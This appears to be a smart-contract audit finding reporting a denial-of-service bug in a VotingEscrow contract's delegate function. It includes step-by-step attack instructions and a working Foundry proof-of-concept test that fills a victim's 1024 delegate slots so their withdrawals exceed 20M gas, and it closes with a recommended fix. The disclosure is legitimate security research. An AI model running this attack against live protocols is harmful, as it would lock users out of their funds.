# User can DoS withdrawals and transfers by delegating 1024 times to an NFT owner

## Summary 

Any user can delegate the balance of the locked NFT amount to anyone by calling `VotingEscrow::delegate`, which is currently saved in an array. Currently the protocol has set a cap of `MAX_DELEGATES=1024`, preventing the address from having an unbounded array. 

However, even with the check, if an address has all 1024 spots filled it would still cost arround 23M to execute a withdrawal or transfer.

## Vulnereability Details

A malicious user can fill up any user's tokenIds address by:

1. Create a lock with a really small amount 
2. Call `VotingEscrow::delegate` with the victims address as parameter
3. Wait 1 second
4. Repeat 


## Proof of Concept


Paste this test inside of `VotingEscrow.t.sol` and in the terminal run with a greater gas limit to avoid OutOfGas Errors:

```bash
forge test --match-test testUserCanDoSOtherUserByDelegating -vv --gas-limit 200000000000
```

```solidity
    function testUserCanDoSOtherUserByDelegating() public {
        flowDaiPair.approve(address(escrow), type(uint256).max);
        uint tokenId = escrow.create_lock(TOKEN_1, 7 days);

        address attacker = makeAddr("attacker");

        deal(address(flowDaiPair), attacker, 1e18);

        vm.prank(attacker);
        flowDaiPair.approve(address(escrow), type(uint256).max);

        uint MAXTIME = 52 * 7 * 86400;

        for (uint256 i = 0; i < escrow.MAX_DELEGATES() - 1; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 2);

            vm.startPrank(attacker);

            escrow.create_lock(0.000005e18, MAXTIME);
            escrow.delegate(address(this));
            vm.stopPrank();
        }

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 7 days);
        uint initialGas = gasleft();
        escrow.withdraw(tokenId);
        uint gasUsed = initialGas - gasleft();

        //@review -> The gas used for withdraw is over 20_000_000
        assertGt(gasUsed, 20_000_000);
    }
```

## Impact

Complete DoS of withdrawals and transfers.

## Tool Used

Manual review

## Recommendation

Consider lowering the `MAX_DELEGATES` to something like 128/256, which will make sure when withdrawing/transfering not so much gas will be consumed.
